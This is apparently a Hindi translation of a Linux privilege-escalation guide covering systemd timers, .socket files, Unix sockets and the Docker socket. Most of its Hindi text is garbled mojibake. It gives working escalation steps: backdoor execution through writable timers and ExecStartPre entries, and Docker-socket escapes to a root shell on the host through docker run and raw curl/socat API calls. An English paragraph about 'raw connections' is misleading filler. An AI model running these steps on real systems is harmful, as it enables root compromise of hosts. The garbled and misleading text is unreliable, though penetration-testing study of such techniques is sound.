**рдЯрд╛рдЗрдорд░реНрд╕** рд╕рд┐рд╕реНрдЯрдордбреА рдпреВрдирд┐рдЯ рдлрд╝рд╛рдЗрд▓ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдирд╛рдо `**.timer**` рд╕реЗ рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рдЬреЛ `**.service**` рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ рдЗрд╡реЗрдВрдЯреНрд╕ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреА рд╣реИрдВред **рдЯрд╛рдЗрдорд░реНрд╕** рдХреНрд░реЙрди рдХреЗ рд╡рд┐рдХрд▓реНрдк рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЗрдирдореЗрдВ рдХреИрд▓реЗрдВрдбрд░ рд╕рдордп рдЗрд╡реЗрдВрдЯреНрд╕ рдФрд░ рдореЛрдиреЛрдЯреЛрдирд┐рдХ рд╕рдордп рдЗрд╡реЗрдВрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рд╕рд╣рдЬ рд╕рдорд░реНрдерди рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЗрдиреНрд╣реЗрдВ рдЕрд╕рд┐рдВрдХреНрд░реЛрдирд╕ рд░реВрдк рд╕реЗ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЖрдк рд╕рднреА рдЯрд╛рдЗрдорд░реНрд╕ рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
systemctl list-timers --all
```
### рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдЯрд╛рдЗрдорд░

рдпрджрд┐ рдЖрдк рдПрдХ рдЯрд╛рдЗрдорд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕реЗ рдХреБрдЫ systemd.unit рдХреЗ рдЕрд╕реНрддрд┐рддреНрд╡ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ `.service` рдпрд╛ `.target`)
```bash
Unit=backdoor.service
```
рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдореЗрдВ рдЖрдк рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЗрдХрд╛рдИ рдХреНрдпрд╛ рд╣реИ:

> рдЯрд╛рдЗрдорд░ рдХреЗ рд╕рдордп рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдкрд░ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдХрд╛рдИред рдпрд╣ рддрд╛рд░реНрдХрд┐рдХ рдПрдХ рдЗрдХрд╛рдИ рдирд╛рдо рд╣реИ, рдЬрд┐рд╕рдХрд╛ рд╕реВрдлрд╝рд┐рдХреНрд╕ ".timer" рдирд╣реАрдВ рд╣реИред рдпрджрд┐ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЗрд╕ рдорд╛рди рдХреА рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдореВрд▓реНрдп рдПрдХ рд╕реЗрд╡рд╛ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо рдЯрд╛рдЗрдорд░ рдЗрдХрд╛рдИ рдХреЗ рдирд╛рдо рдХреЗ рд╕рдорд╛рди рд╣реЛрддрд╛ рд╣реИ, рд╕реВрдлрд╝рд┐рдХреНрд╕ рдХреЛ рдЫреЛрдбрд╝рдХрд░ред (рдКрдкрд░ рджреЗрдЦреЗрдВ) рд╕рд▓рд╛рд╣ рджреА рдЬрд╛рддреА рд╣реИ рдХрд┐ рд╕рдХреНрд░рд┐рдп рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЗрдХрд╛рдИ рдХрд╛ рдирд╛рдо рдФрд░ рдЯрд╛рдЗрдорд░ рдЗрдХрд╛рдИ рдХрд╛ рдЗрдХрд╛рдИ рдирд╛рдо рд╕рдорд╛рди рд░реВрдк рд╕реЗ рдирд╛рдорд┐рдд рд╣реЛрдВ, рд╕реВрдлрд╝рд┐рдХреНрд╕ рдХреЛ рдЫреЛрдбрд╝рдХрд░ред

рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЪрд╛рд╣рд┐рдП:

* рдХрд┐рд╕реА рд╕рд┐рд╕реНрдЯрдордб рдЗрдХрд╛рдИ (рдЬреИрд╕реЗ `.service`) рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ рдЬреЛ **рдПрдХ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд░рд╣реА рд╣реИ**
* рдХрд┐рд╕реА рд╕рд┐рд╕реНрдЯрдордб рдЗрдХрд╛рдИ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ рдЬреЛ **рдПрдХ рд╕рдВрдмрдВрдзрд┐рдд рдкрде рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд░рд╣реА рд╣реИ** рдФрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд╕рд┐рд╕реНрдЯрдордб рдкрд╛рде** рдкрд░ **рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдЕрдзрд┐рдХрд╛рд░** рд╣реИрдВ (рдЙрд╕ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП)

**рдЯрд╛рдЗрдорд░ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВ `man systemd.timer` рдХреЗ рд╕рд╛рдеред**

### **рдЯрд╛рдЗрдорд░ рд╕рдХреНрд╖рдо рдХрд░рдирд╛**

рдЯрд╛рдЗрдорд░ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рд░реВрдЯ рдЕрдзрд┐рдХрд╛рд░ рдЪрд╛рд╣рд┐рдП рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer тЖТ /lib/systemd/system/backu2.timer.
```
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ **рдЯрд╛рдЗрдорд░** рдХреЛ **рд╕рдХреНрд░рд┐рдп** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` рдкрд░ рдЗрд╕рдХрд╛ symlink рдмрдирд╛рдирд╛ рд╣реЛрдЧрд╛ред

## рд╕реЙрдХреЗрдЯреНрд╕

рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ, рдПрдХ Unix рд╕реЙрдХреЗрдЯ (рддрдХрдиреАрдХреА рд░реВрдк рд╕реЗ, рд╕рд╣реА рдирд╛рдо Unix рдбреЛрдореЗрди рд╕реЙрдХреЗрдЯ, **UDS**) рдПрдХ рдорд╢реАрди рдкрд░ рдпрд╛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдорд╢реАрдиреЛрдВ рдореЗрдВ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд░реНрд╡рд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдлреНрд░реЗрдорд╡рд░реНрдХ рдореЗрдВ рджреЛ рдЕрд▓рдЧ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдмреАрдЪ **рд╕рдВрдЪрд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рджреЗрддрд╛ рд╣реИред рдФрд░ рдЕрдзрд┐рдХ рд╕рдЯреАрдХрддрд╛ рд╕реЗ рдХрд╣реЗрдВ рддреЛ, рдпрд╣ рдПрдХ рдорд╛рдирдХ Unix рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╣реИред (рдпрд╣рд╛рдВ рд╕реЗ [рдкрдврд╝реЗрдВ](https://www.linux.com/news/what-socket/))ред

рд╕реЙрдХреЗрдЯреНрд╕ `.socket` рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

**`man systemd.socket` рдХреЗ рд╕рд╛рде рд╕реЙрдХреЗрдЯреНрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВред** рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ, рдХрдИ рджрд┐рд▓рдЪрд╕реНрдк рдкреИрд░рд╛рдореАрдЯрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: рдпреЗ рд╡рд┐рдХрд▓реНрдк рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╣реИрдВ рд▓реЗрдХрд┐рди рд╕рд╛рд░рд╛рдВрд╢ рдореЗрдВ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ **рдЗрд╕рдХреЗ рдмрд╛рд╣рд░ рдХрд╣рд╛рдВ рд╕реБрдиреЗрдЧрд╛** рд╕реЙрдХреЗрдЯ (AF\_UNIX рд╕реЙрдХреЗрдЯ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдкрде, рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП IPv4/6 рдФрд░/рдпрд╛ рдкреЛрд░реНрдЯ рдирдВрдмрд░, рдЖрджрд┐)
* `Accept`: рдПрдХ рдмреВрд▓рд┐рдпрди рддрд░реНрдХ рд▓реЗрддрд╛ рд╣реИред рдпрджрд┐ **рд╕рддреНрдп**, рддреЛ рдкреНрд░рддреНрдпреЗрдХ рдЖрдЙрдЯрдЧреЛрдЗрдВрдЧ рдХрдиреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХ **рд╕реЗрд╡рд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ** рдФрд░ рдХреЗрд╡рд▓ рдХрдиреЗрдХреНрд╢рди рд╕реЙрдХреЗрдЯ рдЙрд╕реЗ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ **рдЭреВрдард╛**, рддреЛ рд╕рднреА рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ рд╕реЙрдХреЗрдЯ рдЦреБрдж рдХреЛ **рд╢реБрд░реВ рдХрд┐рдП рдЧрдП рд╕реЗрд╡рд╛ рдпреВрдирд┐рдЯ рдХреЛ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рдФрд░ рд╕рднреА рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рдПрдХ рд╕реЗрд╡рд╛ рдпреВрдирд┐рдЯ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдорд╛рди рдбреЗрдЯрд╛рдЧреНрд░рд╛рдо рд╕реЙрдХреЗрдЯреНрд╕ рдФрд░ FIFOs рдХреЗ рд▓рд┐рдП рдирдЧрдгреНрдп рд╣реИ рдЬрд╣рд╛рдВ рдПрдХрд▓ рд╕реЗрд╡рд╛ рдпреВрдирд┐рдЯ рдЕрдирд╡рд░реЛрдзрд┐рдд рд░реВрдк рд╕реЗ рд╕рднреА рдЖрдЙрдЯрдЧреЛрдЗрдВрдЧ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рд╣реИрдВрдбрд▓ рдХрд░рддрд╛ рд╣реИред **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рдореЗрдВ рдЭреВрдард╛** рд╣реЛрддрд╛ рд╣реИред рдкреНрд░рджрд░реНрд╢рди рдХрд╛рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП, рдирдП рдбреЗрдорди рдХреЛ рдХреЗрд╡рд▓ `Accept=no` рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рддрд░реАрдХреЗ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рд╕рд▓рд╛рд╣ рджреА рдЬрд╛рддреА рд╣реИред
* `ExecStartPre`, `ExecStartPost`: рдПрдХ рдпрд╛ рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рд▓реЗрддрд╛ рд╣реИ, рдЬреЛ рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ **рд╕реЙрдХреЗрдЯ**/FIFOs рдХреЛ **рдмрдирд╛рдП рдФрд░ рдмрд╛рдЗрдВрдб рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ** рдпрд╛ **рдмрд╛рдж рдореЗрдВ** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреЗ рд╣реИрдВред рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдХрд╛ рдкрд╣рд▓рд╛ рдЯреЛрдХрди рдПрдХ рд╕рд╢рд░реНрдд рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдирд╛рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдлрд┐рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рддрд╛рд░реНрдХреЛрдВ рдХреЗ рдмрд╛рдж рдЖрддреЗ рд╣реИрдВред
* `ExecStopPre`, `ExecStopPost`: рдФрд░ рднреА **рдХрдорд╛рдВрдб** рдЬреЛ рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ **рд╕реЙрдХреЗрдЯ**/FIFOs рдХреЛ **рдмрдВрдж рдХрд░рдиреЗ рдФрд░ рд╣рдЯрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ** рдпрд╛ **рдмрд╛рдж рдореЗрдВ** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреЗ рд╣реИрдВред
* `Service`: **рдЗрдирдХрдорд┐рдВрдЧ рдЯреНрд░реИрдлрд╝рд┐рдХ** рдкрд░ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╕реЗрд╡рд╛** рдпреВрдирд┐рдЯ рдирд╛рдо рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ рдХреЗрд╡рд▓ Accept=no рд╡рд╛рд▓реЗ рд╕реЙрдХреЗрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рддреА рд╣реИред рдпрд╣ рд╕реЙрдХреЗрдЯ рдХреЗ рдирд╛рдо рдХреЗ рд╕рд╛рде рд╕рдорд╛рди рдирд╛рдо рд╡рд╛рд▓реА рд╕реЗрд╡рд╛ (рд╕рдлрд╝рд┐рдХреНрд╕ рдХреЛ рдмрджрд▓рдХрд░) рдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рдореЗрдВ рд▓реЗрддрд╛ рд╣реИред рдЕрдзрд┐рдХрд╛рдВрд╢ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдЗрд╕ рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред

### рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп .socket рдлрд╝рд╛рдЗрд▓реЗрдВ

рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ **рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп** `.socket` рдлрд╝рд╛рдЗрд▓ рдорд┐рд▓рддреА рд╣реИ, рддреЛ рдЖрдк `[Socket]` рдЦрдВрдб рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рдХреБрдЫ рдРрд╕рд╛ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ: `ExecStartPre=/home/kali/sys/backdoor` рдФрд░ рд╕реЙрдХреЗрдЯ рдмрдирд╛рдП рдЬрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдмреИрдХрдбреЛрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, рдЖрдкрдХреЛ **рд╕рдВрднрд╡рддрдГ рдорд╢реАрди рдХреЗ рдкреБрдирд░рд╛рд░рдВрдн рд╣реЛрдиреЗ рддрдХ рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рдиреА рдкрдбрд╝реЗрдЧреА**ред\
_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдЙрд╕ рд╕реЙрдХреЗрдЯ рдлрд╝рд╛рдЗрд▓ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдпрд╛ рддреЛ рдмреИрдХрдбреЛрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдирд╣реАрдВ рд╣реЛрдЧрд╛_

### рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рд╕реЙрдХреЗрдЯреНрд╕

рдпрджрд┐ рдЖрдк **рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рд╕реЙрдХреЗрдЯ** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддреЗ рд╣реИрдВ (_рдЕрдм рд╣рдо Unix рд╕реЙрдХреЗрдЯ рдХреА рдмрд╛рдд рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдФрд░ `.socket` рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдмрд╛рдд рдирд╣реАрдВ рдХрд░ рд░рд╣реЗ рд╣реИрдВ_), рддреЛ рдЖрдк рдЙрд╕ рд╕реЙрдХреЗрдЯ рдХреЗ рд╕рд╛рде **рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рд╢рд╛рдпрдж рдПрдХ рд╕рдВрдХрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### Unix рд╕реЙрдХреЗрдЯреНрд╕ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ
```bash
netstat -a -p --unix
```
### рдХрдЪреНрдЪреА рдХрдиреЗрдХреНрд╢рди

When performing a penetration test, it is common to gain initial access to a target system with limited privileges. In order to escalate those privileges and gain further access, one technique that can be used is called "privilege escalation". This involves exploiting vulnerabilities or misconfigurations in the system to gain higher levels of access and control.

One method of privilege escalation is through a raw connection. A raw connection allows direct communication with the underlying operating system, bypassing any restrictions or security measures in place. This can be achieved by exploiting vulnerabilities in the system's network stack or by leveraging insecure configurations.

To establish a raw connection, you can use tools like `netcat` or `socat`. These tools allow you to create a network connection and interact with the system at a low level. By sending specially crafted packets or commands, you can exploit vulnerabilities and gain elevated privileges.

It is important to note that privilege escalation through a raw connection can be risky and may leave traces on the target system. Therefore, it is crucial to exercise caution and ensure that you have proper authorization before attempting such techniques.

By understanding and utilizing privilege escalation techniques like raw connections, a penetration tester can effectively assess the security of a system and identify potential vulnerabilities that could be exploited by malicious actors.
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**рд╢реЛрдзрди рдЙрджрд╛рд╣рд░рдг:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP рд╕реЙрдХреЗрдЯреНрд╕

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреБрдЫ **HTTP рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реЙрдХреЗрдЯреНрд╕ рд╕реБрди рд░рд╣реЗ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ** (_рдореИрдВ .socket рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдмрд╛рдд рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реВрдБ, рдмрд▓реНрдХрд┐ рдпреВрдирд┐рдХреНрд╕ рд╕реЙрдХреЗрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЗрдВ_). рдЖрдк рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
рдпрджрд┐ рд╕реЙрдХреЗрдЯ HTTP рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░рддрд╛ рд╣реИ**, рддреЛ рдЖрдк рдЙрд╕рдХреЗ рд╕рд╛рде **рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рд╢рд╛рдпрдж рдХреБрдЫ рд╕рдВрдХрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ

**рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ** рдЖрдорддреМрд░ рдкрд░ `/var/run/docker.sock` рдкрд░ рд╕реНрдерд┐рдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдХреЗрд╡рд▓ `root` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ `docker` рд╕рдореВрд╣ рджреНрд╡рд╛рд░рд╛ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рд╣реЛрддрд╛ рд╣реИред
рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ **рдЖрдкрдХреЗ рдкрд╛рд╕ рдЙрд╕ рд╕реЙрдХреЗрдЯ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ**, рддреЛ рдЖрдк рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред
рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрджреЗрд╢:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### рдбреЙрдХрд░ рд╡реЗрдм API рдХрд╛ рдЙрдкрдпреЛрдЧ рдбреЙрдХрд░ рдкреИрдХреЗрдЬ рдХреЗ рдмрд┐рдирд╛ рд╕реЙрдХреЗрдЯ рд╕реЗ рдХрд░реЗрдВ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ** рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ рд▓реЗрдХрд┐рди рдЖрдк рдбреЙрдХрд░ рдмрд╛рдЗрдирд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рд╢рд╛рдпрдж рдпрд╣ рд╕реНрдерд╛рдкрд┐рдд рднреА рдирд╣реАрдВ рд╣реИ), рддреЛ рдЖрдк `curl` рдХреЗ рд╕рд╛рде рд╕реАрдзреЗ рд╡реЗрдм API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИрдВ рдХрд┐ рдХреИрд╕реЗ **рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдмрдирд╛рдПрдВ рдЬреЛ рд╣реЛрд╕реНрдЯ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд░реВрдЯ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рддрд╛ рд╣реИ** рдФрд░ `socat` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирдП рдбреЙрдХрд░ рдореЗрдВ рдХрдорд╛рдВрдбреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВред
```bash
# List docker images
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
#[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
# Send JSON to docker API to create the container
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
#{"Id":"<NewContainerID>","Warnings":[]}
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
рдЕрдВрддрд┐рдо рдХрджрдо рд╣реИ `socat` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдВрдЯреЗрдирд░ рдХреЗ рд╕рд╛рде рдПрдХ рдХрдиреЗрдХреНрд╢рди рдЖрд░рдВрдн рдХрд░рдирд╛, "рдЕрдЯреИрдЪ" рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВред
```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

#HTTP/1.1 101 UPGRADED
#Content-Type: application/vnd.docker.raw-stream
#Connection: Upgrade
#Upgrade: tcp
```
рдЕрдм, рдЖрдк рдЗрд╕ `socat` рдХрдиреЗрдХреНрд╢рди рд╕реЗ рдХрдВрдЯреЗрдирд░ рдкрд░ рдХрдорд╛рдВрдбреНрд╕ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред

### рдЕрдиреНрдп

